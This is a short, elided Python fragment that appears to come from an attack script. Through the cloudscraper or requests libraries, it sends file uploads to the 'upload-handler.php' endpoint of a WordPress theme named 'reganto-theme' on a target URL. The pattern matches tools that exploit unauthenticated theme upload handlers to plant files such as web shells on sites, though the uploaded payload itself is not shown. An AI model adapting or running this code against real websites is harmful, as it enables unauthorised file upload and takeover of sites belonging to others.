...
try:
    ...
    if method == 'cloudscraper':
        scraper.post('http://'+ url +'/wp-content/themes/reganto-theme/functions/upload-handler.php', data=data, files=files, headers=headers, timeout=timeout, verify=verify, allow_redirects=redirect)
        ...
        requests.post('http://'+ url +'/wp-content/themes/reganto-theme/functions/upload-handler.php', data=data, files=files, headers=headers, timeout=timeout, verify=verify, allow_redirects=redirect)
